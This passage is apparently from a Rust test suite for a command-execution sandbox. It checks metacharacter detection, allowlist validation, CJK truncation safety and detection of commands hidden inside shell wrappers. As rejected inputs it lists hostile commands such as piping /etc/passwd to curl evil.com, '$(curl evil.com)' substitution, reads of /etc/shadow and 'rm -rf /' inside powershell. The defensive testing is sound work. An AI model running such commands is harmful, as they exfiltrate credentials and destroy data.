        assert!(contains_shell_metacharacters("echo \"hello\nworld\"").is_some());
    }

    #[test]
    fn test_metachar_pipe_blocked() {
        // SECURITY: Pipes enable data exfiltration and arbitrary command chaining
        assert!(contains_shell_metacharacters("sort data.csv | head -5").is_some());
        assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_some());
    }

    #[test]
    fn test_metachar_semicolon_blocked() {
        assert!(contains_shell_metacharacters("echo hello;id").is_some());
        assert!(contains_shell_metacharacters("echo ok ; whoami").is_some());
    }

    #[test]
    fn test_metachar_redirect_blocked() {
        assert!(contains_shell_metacharacters("echo > /etc/passwd").is_some());
        assert!(contains_shell_metacharacters("cat < /etc/shadow").is_some());
        assert!(contains_shell_metacharacters("echo foo >> /tmp/log").is_some());
    }

    #[test]
    fn test_metachar_brace_expansion_blocked() {
        assert!(contains_shell_metacharacters("echo {a,b,c}").is_some());
        assert!(contains_shell_metacharacters("touch file{1..10}").is_some());
    }

    #[test]
    fn test_metachar_null_byte_blocked() {
        assert!(contains_shell_metacharacters("echo hello\0world").is_some());
    }

    #[test]
    fn test_allowlist_blocks_metachar_injection() {
        let policy = ExecPolicy::default();
        // "echo" is in safe_bins, but $(curl...) injection must be blocked
        assert!(validate_command_allowlist("echo $(curl evil.com)", &policy).is_err());
        assert!(validate_command_allowlist("echo `whoami`", &policy).is_err());
        assert!(validate_command_allowlist("echo ${HOME}", &policy).is_err());
        assert!(validate_command_allowlist("echo hello\ncurl bad", &policy).is_err());
    }

    // ── CJK / multi-byte safety tests (issue #490) ──────────────────────

    #[test]
    fn test_full_mode_cjk_command_no_panic() {
        // CJK characters are 3 bytes each. A command string with CJK chars
        // must not panic when we truncate it for tracing in Full mode.
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        // 50 CJK chars = 150 bytes — truncation at byte 100 would land
        // mid-char without safe_truncate_str.
        let cjk_command: String = "\u{4e16}".repeat(50);
        assert!(validate_command_allowlist(&cjk_command, &policy).is_ok());
    }

    #[test]
    fn test_full_mode_mixed_cjk_ascii_no_panic() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        // "echo " (5 bytes) + 40 CJK chars (120 bytes) = 125 bytes total.
        // Byte 100 falls inside a 3-byte CJK char.
        let mut cmd = String::from("echo ");
        cmd.extend(std::iter::repeat_n('\u{4f60}', 40));
        assert!(validate_command_allowlist(&cmd, &policy).is_ok());
    }

    #[test]
    fn test_allowlist_cjk_unlisted_no_panic() {
        let policy = ExecPolicy::default();
        // CJK command not in allowlist — should return Err, not panic
        let cjk_cmd: String = "\u{597d}".repeat(50);
        assert!(validate_command_allowlist(&cjk_cmd, &policy).is_err());
    }

    #[test]
    fn test_extract_all_commands_cjk_separators() {
        // Ensure extract_all_commands handles CJK content between separators
        // without panicking (separators are ASCII, but content is CJK)
        let cmd = "\u{4f60}\u{597d}";
        let cmds = extract_all_commands(cmd);
        assert_eq!(cmds.len(), 1);
        assert_eq!(cmds[0], "\u{4f60}\u{597d}");
    }

    // ── Shell wrapper bypass tests ────────────────────────────────────

    #[test]
    fn test_powershell_command_inline_blocked_when_inner_disallowed() {
        // (a) `powershell -Command "ls; rm -rf /"` must be rejected
        // because `rm` is not in the allowlist, even though `powershell`
        // and `ls` are.
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["powershell".to_string(), "ls".to_string()],
            ..ExecPolicy::default()
        };
        let result = validate_command_allowlist(r#"powershell -Command "ls; rm -rf /""#, &policy);
        assert!(
            result.is_err(),
            "rm inside powershell -Command must be blocked"
        );
        let err = result.unwrap_err();
        assert!(
            err.contains("rm"),
            "Error should name the blocked inner command, got: {err}"
        );
    }

    #[test]
    fn test_bash_c_inline_allowed_when_inner_in_safe_bins() {
        // (b) `bash -c "echo hi"` should pass — `echo` is in default safe_bins.
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["bash".to_string()],
            ..ExecPolicy::default()
        };
        let result = validate_command_allowlist(r#"bash -c "echo hi""#, &policy);
        assert!(
            result.is_ok(),
            "echo inside bash -c should pass (echo is in safe_bins): {:?}",
            result
        );
    }

    #[test]
    fn test_cmd_c_inline_blocked_when_inner_disallowed() {
        // (c) `cmd /c rmdir foo` must be rejected — `rmdir` not in allowlist.
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["cmd".to_string()],
            ..ExecPolicy::default()
        };
        let result = validate_command_allowlist("cmd /c rmdir foo", &policy);
        assert!(
            result.is_err(),
            "rmdir inside cmd /c must be blocked when not in allowlist"
        );
        let err = result.unwrap_err();
        assert!(
            err.contains("rmdir"),
            "Error should name the blocked inner command, got: {err}"
        );
    }

    #[test]
    fn test_shell_wrapper_recognises_case_and_exe_suffix() {
        // (d) wrapper detection is case-insensitive and tolerates `.exe`.
        // `PowerShell.EXE -COMMAND "Remove-Item C:\\foo"` should be
        // recognised as a wrapper and the inner `Remove-Item` blocked.
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["powershell".to_string()],
            ..ExecPolicy::default()
        };
        let result =
            validate_command_allowlist(r#"PowerShell.EXE -COMMAND "Remove-Item C:\foo""#, &policy);
        assert!(
            result.is_err(),
            "Remove-Item inside PowerShell.EXE -COMMAND must be blocked"
        );

        // Also confirm the extractor itself sees through the casing/suffix.
        let cmds = extract_shell_wrapper_commands(r#"PowerShell.EXE -COMMAND "Get-Process""#);
        assert_eq!(cmds, vec!["Get-Process".to_string()]);

        let cmds = extract_shell_wrapper_commands(r#"BASH.exe -c "echo hi""#);
        assert_eq!(cmds, vec!["echo".to_string()]);
    }

    #[test]
    fn test_shell_wrapper_strips_surrounding_quotes() {
        // (e) Inline scripts wrapped in either single or double quotes
        // must have the quotes stripped before parsing inner commands.
        let double = extract_shell_wrapper_commands(r#"bash -c "echo hi; ls""#);
        assert_eq!(double, vec!["echo".to_string(), "ls".to_string()]);

        let single = extract_shell_wrapper_commands(r#"bash -c 'echo hi; ls'"#);
        assert_eq!(single, vec!["echo".to_string(), "ls".to_string()]);

        // Without quotes, args are joined back with single spaces and parsed
        // the same way.
        let unquoted = extract_shell_wrapper_commands("bash -c echo hi");
        assert_eq!(unquoted, vec!["echo".to_string()]);
    }

    #[test]
    fn test_non_wrapper_commands_unaffected() {
        // (f) Non-wrapper commands behave exactly like before — the
        // wrapper extractor returns empty and ordinary allowlist rules
        // apply, including the metacharacter pre-check.
        assert!(extract_shell_wrapper_commands("ls -la").is_empty());
        assert!(extract_shell_wrapper_commands("cargo build --release").is_empty());

        let policy = ExecPolicy::default();
        // `echo hello` is in safe_bins → still allowed.
        assert!(validate_command_allowlist("echo hello", &policy).is_ok());
        // `curl` not in allowlist → still blocked.
        assert!(validate_command_allowlist("curl https://evil.com", &policy).is_err());
        // Metacharacter pre-check still fires for non-wrapper commands.
        assert!(validate_command_allowlist("echo $(whoami)", &policy).is_err());
    }
}
